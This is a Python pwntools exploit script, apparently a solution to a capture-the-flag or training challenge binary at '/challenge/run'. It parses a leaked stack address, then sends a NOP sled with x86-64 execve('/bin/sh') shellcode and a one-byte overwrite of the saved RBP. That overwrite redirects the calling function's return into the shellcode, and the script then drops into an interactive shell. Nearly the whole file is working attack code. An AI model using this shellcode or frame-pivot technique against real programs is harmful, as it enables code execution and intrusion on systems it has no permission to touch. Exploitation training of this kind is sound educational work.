#! /usr/bin/env python3
from pwn import *
from time import sleep
import re

context.log_level="error"

shellcode = b'\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xd2\x52\x57\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05\x48\x31\xc0\xb0\x3c\x48\x31\xff\x0f\x05'

target = process(["/challenge/run"])
# use below to debug, breakpoints will probably not be correct
#target = process(["gdb", "-ex", "b 48", "-ex", "b 60", "-ex", "run", "-ex", "deref -l 20", "--args", "/challenge/run"])

# get buffer location and save as integer value to buffer_addr 
buffer_addr=32
buffer_str = target.readline()
res = re.findall(b"0x[a-f0-9]+", buffer_str)
buffer_addr = int(res[0], 16)
print(f"PYTHON: {hex(buffer_addr)=}")

# calculate desired value for saved RBP's LSB (near end of buffer)
LSB_new_rbp_addr_val = (buffer_addr + 112) & 0xff
print(f"PYTHON: {hex(LSB_new_rbp_addr_val)=}")
    
# this byte will overwrite the single LSB of the saved RBP (as far as we can go)
LSB_new_rbp_as_byte = LSB_new_rbp_addr_val.to_bytes(1, byteorder='big')

# payload looks like
#     \x90*21 + shellcode == 64 bytes (could do more but might need)
#     filler until last 16 bytes of buffer
#     ...
#     temp rbp value (this will be rbp value after leave in this function)
#     new IP of calling function (on ret from calling function will execute at this loc)
#     Single byte of saved EBP (point to temp RBP location)
shellcode = b"\x90" * 21 + shellcode
payload = shellcode + b"F" * (64 - 16) + p64(buffer_addr) + p64(buffer_addr) + LSB_new_rbp_as_byte

                     
#print(f"PYTHON: DEBUG: payload: {''.join([f'\\x{byte:02x}' for byte in payload])    }")

print(f"PYTHON: Sending payload of {len(payload)} bytes")

# send payload
target.sendline(payload)

# go interactive 
target.interactive()

# close it 
target.close() 

